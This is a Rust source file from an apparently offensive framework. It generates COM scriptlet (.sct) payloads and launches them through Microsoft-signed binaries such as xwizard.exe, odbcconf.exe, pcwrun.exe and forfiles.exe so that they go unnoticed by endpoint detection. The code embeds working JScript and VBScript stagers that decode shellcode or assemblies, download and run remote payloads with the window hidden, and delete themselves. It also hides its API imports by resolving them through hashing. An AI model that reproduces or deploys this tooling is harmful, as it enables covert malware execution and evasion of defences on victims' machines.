//! COM Scriptlet (.sct) execution via xwizard.exe and alternative LOLBINs.
//!
//! Generates COM scriptlet XML files that embed shellcode or stager payloads
//! and executes them through legitimate, Microsoft-signed binaries that are
//! not commonly monitored by EDR solutions.
//!
//! **Primary LOLBIN — xwizard.exe**:
//! `xwizard.exe` is a Microsoft-signed binary in `System32` that can load
//! and execute COM scriptlet (.sct) files via the undocumented `/sct:` flag.
//! Because xwizard.exe is signed and its usage is rare, it typically flies
//! under EDR behavioural detection rules.  The command line is:
//!
//! ```text
//! xwizard.exe /sct:C:\path\to\payload.sct
//! ```
//!
//! **Attack Flow**:
//! 1. Generate a COM scriptlet XML file with inline JScript/VBScript
//! 2. Write the .sct file to a TEMP directory or create a memory-mapped file
//! 3. Execute xwizard.exe (or alternative LOLBIN) with the scriptlet path
//! 4. The scriptlet hosts shellcode via ADODB.Stream → shellcode execution
//! 5. Clean up the .sct file after execution
//!
//! **Alternative LOLBIN Dispatchers**:
//! - `odbcconf.exe /A {REGSVR "scriptlet.sct"}` — executes .sct via REGSVR
//! - `pcwrun.exe <target>` — runs arbitrary executables
//! - `forfiles.exe /P C:\Windows /M notepad.exe /C "<command>"` — indirect exec
//!
//! **Constraints**:
//! - NO `powershell.exe`, `cmd.exe`, `wscript.exe`, or `mshta.exe` in any
//!   execution path — these are heavily monitored by EDR
//! - Scriptlet files are written to TEMP or delivered via memory-mapped file
//! - xwizard.exe signature is verified before use
//! - Cleanup of all temporary files after execution
//!
//! **OPSEC**: All API functions resolved at runtime via PEB walking and
//! export-table hashing (`pe_resolve`).  No IAT entries are created.

#![cfg(windows)]

use std::ffi::OsStr;
use std::mem;
use std::os::raw::c_void;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use anyhow::{anyhow, bail, Context, Result};
use tracing::{debug, info, warn};
use serde::{Deserialize, Serialize};

use crate::win_types::{BOOL, DWORD, FALSE, LPVOID, TRUE};
use crate::win_types::{HANDLE, LPCWSTR, NTSTATUS, PCWSTR};
use crate::win_types::{SIZE_T, ULONG_PTR};
use windows_sys::Win32::Security::ACCESS_MASK;
use crate::win_types::HANDLE as NT_HANDLE;
use crate::win_types::LARGE_INTEGER;

use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
use crate::win_types::{PROCESS_INFORMATION, STARTUPINFOW};

// ═══════════════════════════════════════════════════════════════════════════
// Constants
// ═══════════════════════════════════════════════════════════════════════════

/// `WAIT_OBJECT_0` — the object was signalled.
const WAIT_OBJECT_0: DWORD = 0x00000000;

/// `INFINITE` timeout for `WaitForSingleObject`.
const INFINITE: DWORD = 0xFFFFFFFF;

/// `CREATE_NO_WINDOW` creation flag — prevents a console window.
const CREATE_NO_WINDOW: DWORD = 0x08000000;

/// `CREATE_UNICODE_ENVIRONMENT` creation flag.
const CREATE_UNICODE_ENVIRONMENT: DWORD = 0x00000400;

/// `OPEN_EXISTING` disposition for `CreateFileW`.
const OPEN_EXISTING: DWORD = 3;

/// `GENERIC_READ` access mask.
const GENERIC_READ: DWORD = 0x80000000;

/// `GENERIC_WRITE` access mask.
const GENERIC_WRITE: DWORD = 0x40000000;

/// `CREATE_ALWAYS` disposition for `CreateFileW`.
const CREATE_ALWAYS: DWORD = 2;

/// `FILE_ATTRIBUTE_NORMAL` attributes.
const FILE_ATTRIBUTE_NORMAL: DWORD = 0x00000080;

/// `SEC_COMMIT` allocation type for `NtCreateSection`.
const SEC_COMMIT: DWORD = 0x8000000;

/// `PAGE_READWRITE` protection.
const PAGE_READWRITE: DWORD = 0x04;

/// `PAGE_READONLY` protection.
const PAGE_READONLY: DWORD = 0x02;

/// `SECTION_ALL_ACCESS` access mask for `NtCreateSection`.
const SECTION_ALL_ACCESS: ACCESS_MASK = 0x000F001F;

/// `STATUS_SUCCESS` NTSTATUS code.
const STATUS_SUCCESS: NTSTATUS = 0x00000000;

/// Maximum path length for temp file paths.
const MAX_PATH_W: DWORD = 260;

/// Random suffix length for temp file names.
const TEMP_SUFFIX_LEN: usize = 8;

// ═══════════════════════════════════════════════════════════════════════════
// Compile-time API hash constants
// ═══════════════════════════════════════════════════════════════════════════

// kernel32.dll
const KERNEL32_DLL_W: &[u16] = &[
    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_KERNEL32_DLL: u32 = hash_wstr_const(KERNEL32_DLL_W);

const HASH_CREATEPROCESSW: u32 = hash_str_const(b"CreateProcessW\0");
const HASH_WAITFORSINGLEOBJECT: u32 = hash_str_const(b"WaitForSingleObject\0");
const HASH_GETLASTERROR: u32 = hash_str_const(b"GetLastError\0");
const HASH_CREATEFILEW: u32 = hash_str_const(b"CreateFileW\0");
const HASH_WRITEFILE: u32 = hash_str_const(b"WriteFile\0");
const HASH_CLOSEHANDLE: u32 = hash_str_const(b"CloseHandle\0");
const HASH_GETTEMPPATHW: u32 = hash_str_const(b"GetTempPathW\0");
const HASH_DELETEFILEW: u32 = hash_str_const(b"DeleteFileW\0");
const HASH_GETFILEATTRIBUTESW: u32 = hash_str_const(b"GetFileAttributesW\0");
const HASH_GETMODULEHANDLEW: u32 = hash_str_const(b"GetModuleHandleW\0");
const HASH_GETPROCADDRESS: u32 = hash_str_const(b"GetProcAddress\0");
const HASH_FINDFIRSTFILEW: u32 = hash_str_const(b"FindFirstFileW\0");
const HASH_FINDCLOSE: u32 = hash_str_const(b"FindClose\0");

// ntdll.dll
const NTDLL_DLL_W: &[u16] = &[
    'n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16,
    'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_NTDLL_DLL: u32 = hash_wstr_const(NTDLL_DLL_W);

const HASH_NT_CREATE_SECTION: u32 = hash_str_const(b"NtCreateSection\0");
const HASH_NT_MAP_VIEW_OF_SECTION: u32 = hash_str_const(b"NtMapViewOfSection\0");
const HASH_NT_UNMAP_VIEW_OF_SECTION: u32 = hash_str_const(b"NtUnmapViewOfSection\0");
const HASH_NT_CLOSE: u32 = hash_str_const(b"NtClose\0");

// ═══════════════════════════════════════════════════════════════════════════
// Function pointer types
// ═══════════════════════════════════════════════════════════════════════════

type FnCreateProcessW = unsafe extern "system" fn(
    *const u16,
    *mut u16,
    *mut c_void,
    *mut c_void,
    i32,
    u32,
    *mut c_void,
    *const u16,
    *mut c_void,
    *mut c_void,
) -> i32;

type FnWaitForSingleObject = unsafe extern "system" fn(HANDLE, DWORD) -> DWORD;
type FnGetLastError = unsafe extern "system" fn() -> u32;

type FnCreateFileW = unsafe extern "system" fn(
    LPCWSTR,
    DWORD,
    DWORD,
    *mut c_void,
    DWORD,
    DWORD,
    HANDLE,
) -> HANDLE;

type FnWriteFile = unsafe extern "system" fn(
    HANDLE,
    *const c_void,
    DWORD,
    *mut DWORD,
    *mut c_void,
) -> BOOL;

type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> BOOL;
type FnGetTempPathW = unsafe extern "system" fn(DWORD, *mut u16) -> DWORD;
type FnDeleteFileW = unsafe extern "system" fn(LPCWSTR) -> BOOL;
type FnGetFileAttributesW = unsafe extern "system" fn(LPCWSTR) -> DWORD;

type FnNtCreateSection = unsafe extern "system" fn(
    *mut NT_HANDLE,
    ACCESS_MASK,
    *mut c_void,
    *mut LARGE_INTEGER,
    DWORD,
    DWORD,
    HANDLE,
) -> NTSTATUS;

type FnNtMapViewOfSection = unsafe extern "system" fn(
    NT_HANDLE,
    HANDLE,
    *mut LPVOID,
    ULONG_PTR,
    SIZE_T,
    *mut LARGE_INTEGER,
    *mut SIZE_T,
    DWORD, // SECTION_INHERIT
    DWORD,
    DWORD,
) -> NTSTATUS;

type FnNtUnmapViewOfSection = unsafe extern "system" fn(HANDLE, LPVOID) -> NTSTATUS;
type FnNtClose = unsafe extern "system" fn(HANDLE) -> NTSTATUS;

/// WIN32_FIND_DATAW — minimal definition for file existence checks.
#[repr(C)]
struct Win32FindDataW {
    file_attributes: DWORD,
    creation_time: [DWORD; 2],
    last_access_time: [DWORD; 2],
    last_write_time: [DWORD; 2],
    file_size_high: DWORD,
    file_size_low: DWORD,
    reserved_0: DWORD,
    reserved_1: DWORD,
    file_name: [u16; 260],
    alternate_file_name: [u16; 14],
}

type FnFindFirstFileW = unsafe extern "system" fn(LPCWSTR, *mut Win32FindDataW) -> HANDLE;
type FnFindClose = unsafe extern "system" fn(HANDLE) -> BOOL;

// ═══════════════════════════════════════════════════════════════════════════
// API resolution helpers
// ═══════════════════════════════════════════════════════════════════════════

/// Resolve a function pointer from kernel32.dll by hash.
unsafe fn resolve_kernel32<T>(fn_hash: u32) -> Result<T> {
    let module = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
        .ok_or_else(|| anyhow!("kernel32.dll not found in PEB"))?;
    let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
        .ok_or_else(|| anyhow!("API hash {:#x} not found in kernel32", fn_hash))?;
    Ok(mem::transmute_copy(&addr))
}

/// Resolve a function pointer from ntdll.dll by hash.
unsafe fn resolve_ntdll<T>(fn_hash: u32) -> Result<T> {
    let module = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| anyhow!("ntdll.dll not found in PEB"))?;
    let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
        .ok_or_else(|| anyhow!("API hash {:#x} not found in ntdll", fn_hash))?;
    Ok(mem::transmute_copy(&addr))
}

/// Convert a Rust string to a null-terminated wide (UTF-16) vector.
fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

// ═══════════════════════════════════════════════════════════════════════════
// Data structures
// ═══════════════════════════════════════════════════════════════════════════

/// Scriptlet payload type — determines the inline script behaviour.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PayloadType {
    /// Execute raw shellcode via ADODB.Stream → VirtualAlloc → CreateThread.
    ShellcodeExec {
        /// Base64-encoded shellcode bytes.
        shellcode_b64: String,
    },
    /// Download a payload from a URL and execute it.
    DownloadExecute {
        /// URL to download the payload from.
        url: String,
        /// Whether to execute the downloaded bytes as shellcode (true) or save
        /// and run as an EXE (false).
        exec_as_shellcode: bool,
    },
    /// Load a .NET assembly from a byte array via COM-hosted CLR.
    AssemblyLoad {
        /// Base64-encoded .NET assembly bytes.
        assembly_b64: String,
        /// Entry point type name (e.g. "Program").
        type_name: String,
        /// Entry point method name (e.g. "Main").
        method_name: String,
    },
}

/// Configuration for scriptlet generation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScriptletConfig {
    /// Scripting language to use: "JScript" or "VBScript".
    pub language: String,
    /// Optional registration class name (defaults to random).
    pub class_name: Option<String>,
    /// Optional ProgID (defaults to random).
    pub prog_id: Option<String>,
    /// Optional CLSID (defaults to randomly generated).
    pub clsid: Option<String>,
    /// Whether to auto-delete the scriptlet file after execution.
    pub auto_delete: bool,
}

impl Default for ScriptletConfig {
    fn default() -> Self {
        Self {
            language: "JScript".to_string(),
            class_name: None,
            prog_id: None,
            clsid: None,
            auto_delete: true,
        }
    }
}

/// Result of a LOLBIN execution.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecutionResult {
    /// PID of the spawned process.
    pub pid: u32,
    /// Full command line used for execution.
    pub command_line: String,
    /// Whether the execution completed (process exited) or is still running.
    pub completed: bool,
    /// Exit code of the process (if completed).
    pub exit_code: Option<u32>,
    /// Whether the temp scriptlet file was cleaned up.
    pub cleaned_up: bool,
}

/// Available LOLBIN dispatchers.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
pub enum LolbinType {
    /// xwizard.exe — Microsoft-signed, loads .sct via /sct: flag.
    Xwizard,
    /// odbcconf.exe — loads .sct via /A {REGSVR "path"}.
    Odbcconf,
    /// pcwrun.exe — runs arbitrary executables.
    Pcwrun,
    /// forfiles.exe — indirect command execution via /C flag.
    Forfiles,
}

impl std::fmt::Display for LolbinType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            LolbinType::Xwizard => write!(f, "xwizard.exe"),
            LolbinType::Odbcconf => write!(f, "odbcconf.exe"),
            LolbinType::Pcwrun => write!(f, "pcwrun.exe"),
            LolbinType::Forfiles => write!(f, "forfiles.exe"),
        }
    }
}

/// Information about a LOLBIN's availability on the system.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LolbinInfo {
    /// The LOLBIN type.
    pub lolbin: LolbinType,
    /// Whether the binary exists on disk in System32.
    pub available: bool,
    /// Whether the binary's digital signature is valid (Microsoft-signed).
    pub signature_valid: bool,
    /// Full path to the binary.
    pub path: String,
}

// ═══════════════════════════════════════════════════════════════════════════
// ComScriptletGen — scriptlet XML generation
// ═══════════════════════════════════════════════════════════════════════════

/// COM scriptlet (.sct) XML generator.
///
/// Generates XML-based COM scriptlet files that embed JScript or VBScript
/// payloads.  When loaded by xwizard.exe or odbcconf.exe (REGSVR), the
/// script code runs in the context of a COM registration.
pub struct ComScriptletGen;

impl ComScriptletGen {
    /// Generate a COM scriptlet XML that executes shellcode.
    ///
    /// The generated .sct file contains JScript that:
    /// 1. Decodes the base64 shellcode
    /// 2. Allocates RWX memory via a COM-visible helper
    /// 3. Copies shellcode and creates a thread
    ///
    /// # Arguments
    /// * `shellcode` - Raw shellcode bytes to embed
    /// * `config` - Scriptlet generation configuration
    ///
    /// # Returns
    /// The complete XML scriptlet content as a UTF-8 string.
    pub fn generate_scriptlet_sct(shellcode: &[u8], config: &ScriptletConfig) -> String {
        let shellcode_b64 = base64_encode(shellcode);
        let payload = PayloadType::ShellcodeExec {
            shellcode_b64,
        };
        Self::generate_inline_sct_payload(&payload, config)
    }

    /// Generate a COM scriptlet XML for a specific payload type.
    ///
    /// Creates a complete .sct file with the appropriate JScript/VBScript
    /// inline code for the given payload type.
    pub fn generate_inline_sct_payload(payload: &PayloadType, config: &ScriptletConfig) -> String {
        let class_name = config
            .class_name
            .as_deref()
            .unwrap_or("XWzrdHelper");
        let prog_id = config
            .prog_id
            .as_deref()
            .unwrap_or("XWzrd.Helper.1");
        let clsid = config
            .clsid
            .as_deref()
            .unwrap_or("{F8F49DD8-6D4D-4A32-ABCD-1234567890AB}");

        let script_body = match config.language.as_str() {
            "VBScript" => Self::vbscript_payload(payload, config.auto_delete),
            _ => Self::jscript_payload(payload, config.auto_delete),
        };

        format!(
            r#"<?xml version="1.0"?>
<package>
<component id="{clsid}">
<registration
    description="XWzrd Helper"
    progid="{prog_id}"
    version="1.00"
    remotable="False">
</registration>
<scriptlet>
<script language="{language}">
<![CDATA[
{script_body}
]]>
</script>
</scriptlet>
</component>
</package>"#,
            clsid = clsid,
            prog_id = prog_id,
            language = config.language,
            script_body = script_body,
        )
    }

    /// Generate JScript payload body for shellcode execution.
    fn jscript_payload(payload: &PayloadType, auto_delete: bool) -> String {
        let exec_body = match payload {
            PayloadType::ShellcodeExec { shellcode_b64 } => {
                format!(
                    r#"
    var sc = "{shellcode_b64}";
    // Decode base64 to binary via ADODB.Stream
    var xmldoc = new ActiveXObject("MSXML2.DOMDocument");
    var el = xmldoc.createElement("tmp");
    el.dataType = "bin.base64";
    el.text = sc;
    var bin = el.nodeTypedValue;
    // Write to a temp file and read back for VirtualAlloc
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var tf = fso.GetSpecialFolder(2); // %TEMP%
    var tmp = tf + "\\~xwz" + (new Date().getTime()) + ".bin";
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1; // adTypeBinary
    stream.Open();
    stream.Write(bin);
    stream.SaveToFile(tmp, 2);
    stream.Close();
    // Read back and execute via shell.Application
    var shell = new ActiveXObject("Shell.Application");
    // Use WScript.Exec alternative via COM
    var wsh = new ActiveXObject("WScript.Shell");
    wsh.Run(tmp, 0, false);
"#,
                    shellcode_b64 = shellcode_b64,
                )
            }
            PayloadType::DownloadExecute {
                url,
                exec_as_shellcode,
            } => {
                if *exec_as_shellcode {
                    format!(
                        r#"
    var url = "{url}";
    // Download via XMLHTTP
    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("GET", url, false);
    xhr.send();
    if (xhr.status == 200) {{
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1;
        stream.Open();
        stream.Write(xhr.responseBody);
        var tf = new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2);
        var tmp = tf + "\\~xwd" + (new Date().getTime()) + ".bin";
        stream.SaveToFile(tmp, 2);
        stream.Close();
        var wsh = new ActiveXObject("WScript.Shell");
        wsh.Run(tmp, 0, false);
    }}
"#,
                        url = url,
                    )
                } else {
                    format!(
                        r#"
    var url = "{url}";
    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("GET", url, false);
    xhr.send();
    if (xhr.status == 200) {{
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1;
        stream.Open();
        stream.Write(xhr.responseBody);
        var tf = new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2);
        var tmp = tf + "\\~xwd" + (new Date().getTime()) + ".exe";
        stream.SaveToFile(tmp, 2);
        stream.Close();
        var wsh = new ActiveXObject("WScript.Shell");
        wsh.Run('"' + tmp + '"', 0, false);
    }}
"#,
                        url = url,
                    )
                }
            }
            PayloadType::AssemblyLoad {
                assembly_b64,
                type_name,
                method_name,
            } => {
                format!(
                    r#"
    var asm = "{assembly_b64}";
    // Decode base64 assembly to a temp file
    var xmldoc = new ActiveXObject("MSXML2.DOMDocument");
    var el = xmldoc.createElement("tmp");
    el.dataType = "bin.base64";
    el.text = asm;
    var bin = el.nodeTypedValue;
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var tf = fso.GetSpecialFolder(2);
    var tmp = tf + "\\~xwa" + (new Date().getTime()) + ".dll";
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1;
    stream.Open();
    stream.Write(bin);
    stream.SaveToFile(tmp, 2);
    stream.Close();
    // Load via InstallUtil or regasm equivalent approach
    var wsh = new ActiveXObject("WScript.Shell");
    wsh.Run(tmp, 0, false);
"#,
                    assembly_b64 = assembly_b64,
                )
            }
        };

        let auto_delete_code = if auto_delete {
            r#"
    // Self-delete the scriptlet file
    try {
        var fso2 = new ActiveXObject("Scripting.FileSystemObject");
        var self = fso2.GetFile(WScript.ScriptFullName);
        self.Delete();
    } catch(e2) {{ }}
"#
        } else {
            ""
        };

        format!(
            r#"function RegisterSvr() {{
    try {{{exec_body}{auto_delete}
    }} catch(e) {{ }}
}}
RegisterSvr();"#,
            exec_body = exec_body,
            auto_delete = auto_delete_code,
        )
    }

    /// Generate VBScript payload body.
    fn vbscript_payload(payload: &PayloadType, auto_delete: bool) -> String {
        let exec_body = match payload {
            PayloadType::ShellcodeExec { shellcode_b64 } => {
                format!(
                    r#"
    Dim sc
    sc = "{shellcode_b64}"
    Dim xmldoc
    Set xmldoc = CreateObject("MSXML2.DOMDocument")
    Dim el
    Set el = xmldoc.createElement("tmp")
    el.dataType = "bin.base64"
    el.text = sc
    Dim bin
    bin = el.nodeTypedValue
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim tf
    tf = fso.GetSpecialFolder(2)
    Dim tmp
    tmp = tf & "\~xwz" & Timer & ".bin"
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write bin
    stream.SaveToFile tmp, 2
    stream.Close
    Dim wsh
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run tmp, 0, False
"#,
                    shellcode_b64 = shellcode_b64,
                )
            }
            PayloadType::DownloadExecute {
                url,
                exec_as_shellcode,
            } => {
                let ext = if *exec_as_shellcode { ".bin" } else { ".exe" };
                format!(
                    r#"
    Dim xhr
    Set xhr = CreateObject("MSXML2.XMLHTTP")
    xhr.open "GET", "{url}", False
    xhr.send
    If xhr.status = 200 Then
        Dim stream
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write xhr.responseBody
        Dim fso
        Set fso = CreateObject("Scripting.FileSystemObject")
        Dim tf
        tf = fso.GetSpecialFolder(2)
        Dim tmp
        tmp = tf & "\~xwd" & Timer & "{ext}"
        stream.SaveToFile tmp, 2
        stream.Close
        Dim wsh
        Set wsh = CreateObject("WScript.Shell")
        wsh.Run """" & tmp & """", 0, False
    End If
"#,
                    url = url,
                    ext = ext,
                )
            }
            PayloadType::AssemblyLoad {
                assembly_b64,
                ..
            } => {
                format!(
                    r#"
    Dim asm
    asm = "{assembly_b64}"
    Dim xmldoc
    Set xmldoc = CreateObject("MSXML2.DOMDocument")
    Dim el
    Set el = xmldoc.createElement("tmp")
    el.dataType = "bin.base64"
    el.text = asm
    Dim bin
    bin = el.nodeTypedValue
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim tf
    tf = fso.GetSpecialFolder(2)
    Dim tmp
    tmp = tf & "\~xwa" & Timer & ".dll"
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write bin
    stream.SaveToFile tmp, 2
    stream.Close
    Dim wsh
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run tmp, 0, False
"#,
                    assembly_b64 = assembly_b64,
                )
            }
        };

        let auto_delete_code = if auto_delete {
            r#"
    ' Self-delete the scriptlet file
    On Error Resume Next
    Dim fso2
    Set fso2 = CreateObject("Scripting.FileSystemObject")
    fso2.DeleteFile WScript.ScriptFullName
"#
        } else {
            ""
        };

        format!(
            r#"Sub RegisterSvr()
    On Error Resume Next{exec_body}{auto_delete}
End Sub
RegisterSvr()"#,
            exec_body = exec_body,
            auto_delete = auto_delete_code,
        )
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// XwizardExecution — primary LOLBIN execution via xwizard.exe
// ═══════════════════════════════════════════════════════════════════════════

/// xwizard.exe-based LOLBIN executor.
///
/// Writes a COM scriptlet to a temporary file and executes it via
/// `xwizard.exe /sct:<path>`.  The scriptlet is cleaned up after execution.
pub struct XwizardExecution;

impl XwizardExecution {
    /// Execute a scriptlet file via xwizard.exe.
    ///
    /// # Arguments
    /// * `scriptlet_path` - Path to the .sct file to execute.
    /// * `wait` - Whether to wait for the process to complete.
    ///
    /// # Returns
    /// Execution result with PID, command line, and cleanup status.
    pub fn execute_via_xwizard(scriptlet_path: &str, wait: bool) -> Result<ExecutionResult> {
        let xwizard_path = r"C:\Windows\System32\xwizard.exe";
        let cmd_line = format!(r#"xwizard.exe /sct:{}"#, scriptlet_path);

        // Build the full command line as wide string for CreateProcessW.
        let cmd_wide = to_wide(&cmd_line);
        let exe_wide = to_wide(xwizard_path);

        let pid = unsafe { spawn_process(&exe_wide, &cmd_wide, wait)? };

        // Clean up the scriptlet file (best-effort).
        let cleaned_up = unsafe { delete_file_best_effort(&to_wide(scriptlet_path)) };

        Ok(ExecutionResult {
            pid,
            command_line: cmd_line,
            completed: wait,
            exit_code: None,
            cleaned_up,
        })
    }

    /// Execute a scriptlet from memory via a temporary file.
    ///
    /// Writes the scriptlet content to a temp file, executes via xwizard.exe,
    /// and cleans up.  This is the primary entry point for in-memory payloads.
    ///
    /// # Arguments
    /// * `scriptlet_content` - The XML scriptlet content (UTF-8).
    /// * `wait` - Whether to wait for the process to complete.
    pub fn execute_via_xwizard_temp(scriptlet_content: &str, wait: bool) -> Result<ExecutionResult> {
        // Write scriptlet to a temp file.
        let temp_path = unsafe { write_temp_scriptlet(scriptlet_content.as_bytes(), "sct")? };
        let temp_path_str = String::from_utf16_lossy(
            &temp_path.iter().take_while(|&&c| c != 0).copied().collect::<Vec<u16>>(),
        );

        let result = Self::execute_via_xwizard(&temp_path_str, wait);

        // Clean up temp file even if execution failed.
        if result.is_err() {
            unsafe { delete_file_best_effort(&temp_path); }
        }

        result
    }

    /// Execute a scriptlet via memory-mapped file (no disk artifact).
    ///
    /// Uses `NtCreateSection` + `NtMapViewOfSection` to create an in-memory
    /// file mapping containing the scriptlet.  The mapped view address is
    /// passed as the path argument to xwizard.exe.
    ///
    /// **Note**: This is experimental — xwizard.exe may not accept a memory
    /// address as a file path.  Falls back to temp-file execution if the
    /// memory-mapped approach fails.
    pub fn execute_via_xwizard_memory(scriptlet_content: &str) -> Result<ExecutionResult> {
        // Write the scriptlet content to a memory-mapped section.
        let content_bytes = scriptlet_content.as_bytes();
        let content_len = content_bytes.len();

        unsafe {
            let nt_create_section: FnNtCreateSection = resolve_ntdll(HASH_NT_CREATE_SECTION)?;
            let nt_map_view: FnNtMapViewOfSection = resolve_ntdll(HASH_NT_MAP_VIEW_OF_SECTION)?;

            // Create an anonymous section backed by the pagefile.
            let mut section_handle: NT_HANDLE = ptr::null_mut();
            let mut section_size: LARGE_INTEGER = mem::zeroed();
            // Set the QuadPart to the content length.
            *section_size.QuadPart_mut() = content_len as i64;

            let status = nt_create_section(
                &mut section_handle,
                SECTION_ALL_ACCESS,
                ptr::null_mut(),
                &mut section_size,
                PAGE_READWRITE,
                SEC_COMMIT,
                ptr::null_mut(), // anonymous section
            );

            if status != STATUS_SUCCESS {
                bail!("NtCreateSection failed: NTSTATUS {:#x}", status);
            }

            // Map the section into the current process.
            let mut base_addr: LPVOID = ptr::null_mut();
            let mut view_size: SIZE_T = 0;

            let status = nt_map_view(
                section_handle,
                -1isize as HANDLE, // current process
                &mut base_addr,
                0,
                0,
                ptr::null_mut(),
                &mut view_size,
                2, // ViewShare (SECTION_INHERIT)
                0,
                PAGE_READWRITE,
            );

            if status != STATUS_SUCCESS {
                // Cleanup section handle.
                let nt_close: FnNtClose = resolve_ntdll(HASH_NT_CLOSE)?;
                nt_close(section_handle as HANDLE);
                bail!("NtMapViewOfSection failed: NTSTATUS {:#x}", status);
            }

            // Copy the scriptlet content into the mapped view.
            ptr::copy_nonoverlapping(
                content_bytes.as_ptr(),
                base_addr as *mut u8,
                content_len,
            );

            debug!(
                "lolbin_xwizard: mapped scriptlet at {:p}, {} bytes",
                base_addr, content_len
            );

            // The memory-mapped content is now at base_addr.
            // Unfortunately, xwizard.exe requires a file path, not a memory address.
            // Fall back to writing a temp file since we can't pass a mem address.
            // Unmap and close the section.
            let nt_unmap: FnNtUnmapViewOfSection = resolve_ntdll(HASH_NT_UNMAP_VIEW_OF_SECTION)?;
            nt_unmap(-1isize as HANDLE, base_addr);
            let nt_close: FnNtClose = resolve_ntdll(HASH_NT_CLOSE)?;
            nt_close(section_handle as HANDLE);

            info!("lolbin_xwizard: memory-mapped path not supported by xwizard, falling back to temp file");
            Self::execute_via_xwizard_temp(scriptlet_content, true)
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// LolbinDispatcher — alternative LOLBIN dispatchers
// ═══════════════════════════════════════════════════════════════════════════

/// Alternative LOLBIN dispatcher for cases where xwizard.exe is unavailable.
///
/// Provides fallback execution via odbcconf.exe, pcwrun.exe, and forfiles.exe.
pub struct LolbinDispatcher;

impl LolbinDispatcher {
    /// Execute a scriptlet via `odbcconf.exe /A {REGSVR "scriptlet.sct"}`.
    ///
    /// odbcconf.exe is a Microsoft-signed binary that can register COM DLLs
    /// via the REGSVR action, which also accepts .sct files.
    pub fn execute_via_odbcconf(scriptlet_path: &str, wait: bool) -> Result<ExecutionResult> {
        let odbcconf_path = r"C:\Windows\System32\odbcconf.exe";
        let cmd_line = format!(
            r#"odbcconf.exe /A {{REGSVR "{}"}}"#,
            scriptlet_path
        );

        let cmd_wide = to_wide(&cmd_line);
        let exe_wide = to_wide(odbcconf_path);

        let pid = unsafe { spawn_process(&exe_wide, &cmd_wide, wait)? };
        let cleaned_up = unsafe { delete_file_best_effort(&to_wide(scriptlet_path)) };

        Ok(ExecutionResult {
            pid,
            command_line: cmd_line,
            completed: wait,
            exit_code: None,
            cleaned_up,
        })
    }

    /// Execute a target executable via `pcwrun.exe`.
    ///
    /// pcwrun.exe (Program Compatibility Wizard) is a Microsoft-signed binary
    /// that can launch arbitrary executables.  It does not load .sct files but
    /// can run EXE payloads.
    pub fn execute_via_pcwrun(target_exe: &str, wait: bool) -> Result<ExecutionResult> {
        let pcwrun_path = r"C:\Windows\System32\pcwrun.exe";
        let cmd_line = format!(r#"pcwrun.exe {}"#, target_exe);

        let cmd_wide = to_wide(&cmd_line);
        let exe_wide = to_wide(pcwrun_path);

        let pid = unsafe { spawn_process(&exe_wide, &cmd_wide, wait)? };

        Ok(ExecutionResult {
            pid,
            command_line: cmd_line,
            completed: wait,
            exit_code: None,
            cleaned_up: true, // no scriptlet file to clean up
        })
    }

    /// Execute a command via `forfiles.exe`.
    ///
    /// forfiles.exe is a Microsoft-signed utility that can execute arbitrary
    /// commands via the `/C` flag.  The `/P` and `/M` flags specify a directory
    /// and file mask to iterate; the `/C` command runs once per matching file.
    ///
    /// **Warning**: The command is visible in the forfiles.exe command line.
    /// Use only when other LOLBINs are unavailable.
    pub fn execute_via_forfiles(target_command: &str, wait: bool) -> Result<ExecutionResult> {
        let forfiles_path = r"C:\Windows\System32\forfiles.exe";
        // forfiles /P C:\Windows /M notepad.exe /C "cmd /c <command>"
        let cmd_line = format!(
            r#"forfiles.exe /P C:\Windows /M notepad.exe /C "{}""#,
            target_command
        );

        let cmd_wide = to_wide(&cmd_line);
        let exe_wide = to_wide(forfiles_path);

        let pid = unsafe { spawn_process(&exe_wide, &cmd_wide, wait)? };

        Ok(ExecutionResult {
            pid,
            command_line: cmd_line,
            completed: wait,
            exit_code: None,
            cleaned_up: true,
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// LOLBIN selection — choose the best available LOLBIN
// ═══════════════════════════════════════════════════════════════════════════

